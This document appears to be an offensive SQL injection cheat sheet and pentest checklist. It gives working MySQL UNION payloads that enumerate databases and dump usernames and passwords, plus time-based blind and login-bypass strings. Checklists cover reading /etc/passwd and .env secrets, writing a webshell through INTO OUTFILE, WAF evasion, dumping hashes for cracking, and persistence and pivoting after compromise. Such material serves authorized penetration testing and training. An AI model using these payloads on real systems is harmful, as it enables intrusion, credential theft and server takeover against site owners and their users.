### MySQL Enumeration
```sql
-- databases
' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata-- -

-- tables in current DB
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -

-- columns in a table
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -

-- dump
' UNION SELECT NULL, username, password FROM users-- -
' UNION SELECT NULL, GROUP_CONCAT(username,':',password), NULL FROM users-- -
```

### Time-Based Blind
```sql
' AND IF(1=1, SLEEP(3), 0)-- -                       # MySQL
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0)-- -
```

## Checklist

### Detection
- [ ] Identify every parameter that reaches a query (GET, POST, cookies, headers, JSON bodies)
- [ ] Test each with a single quote — look for SQL error messages
- [ ] Test boolean payloads (`AND 1=1` vs `AND 1=2`)
- [ ] Test time-based payload (`OR SLEEP(5)`)
- [ ] Test numeric contexts without quotes
- [ ] Try different string terminators: `'`, `"`, `)`, `')`, `")`
- [ ] Determine the injection context by looking at the error or the query reconstruction

### Fingerprinting
- [ ] Identify the DBMS (MySQL / MSSQL / PostgreSQL / Oracle / SQLite)
- [ ] Get the version string
- [ ] Identify current user and host
- [ ] Check for stacked query support (`;`)

### Authentication Bypass
- [ ] Try `admin'-- -` in the username field
- [ ] Try `' OR '1'='1` in the password field
- [ ] Try `' OR 1=1 LIMIT 1-- -` (returns first user, usually admin)
- [ ] Try variants with different quote types if the default fails

### UNION Exploitation
- [ ] Count columns with `ORDER BY` incrementing until error
- [ ] Confirm column count with `UNION SELECT 1,2,3,...`
- [ ] Identify which column positions are displayed on the page
- [ ] Enumerate databases via `information_schema.schemata`
- [ ] Enumerate tables in target DB
- [ ] Enumerate columns in target table
- [ ] Dump data from interesting tables (users, credentials, api_keys)
- [ ] Use `GROUP_CONCAT` or `CONCAT` to pack multiple rows when the app shows only one

### Blind Exploitation
- [ ] Boolean-blind: extract DB name char by char with `SUBSTRING` + `ASCII` + binary search
- [ ] Time-based: use `IF(...,SLEEP(N),0)` when no content difference exists
- [ ] Automate with Burp Intruder or a Python script — never do it by hand
- [ ] If both fail, try OOB exfiltration (DNS, HTTP callback)

### File System Attacks
- [ ] Check FILE privilege on the DB user
- [ ] Check `secure_file_priv` restrictions
- [ ] Read `/etc/passwd` to confirm file-read works
- [ ] Read web server config to find DocumentRoot
- [ ] Read application config files for secrets (`.env`, `config.php`)
- [ ] Attempt webshell write via `INTO OUTFILE`
- [ ] Trigger shell via HTTP request

### WAF Encountered
- [ ] Case-toggle keywords (`SeLeCt`)
- [ ] Insert inline comments (`SEL/**/ECT`)
- [ ] Try alternate whitespace (`%09`, `%0a`)
- [ ] Try keyword doubling (`UNIunionON`)
- [ ] Try hex encoding for string values
- [ ] Try MySQL version comments (`/*!50000SELECT*/`)
- [ ] If stuck, switch to SQLMap with `--tamper` scripts

### Post-Exploitation
- [ ] Dump password hashes for offline cracking
- [ ] Look for reused credentials across services (SSH, RDP, cloud)
- [ ] Hunt for API keys, tokens, secrets in app config tables
- [ ] If RCE achieved: upgrade shell, establish persistence, pivot
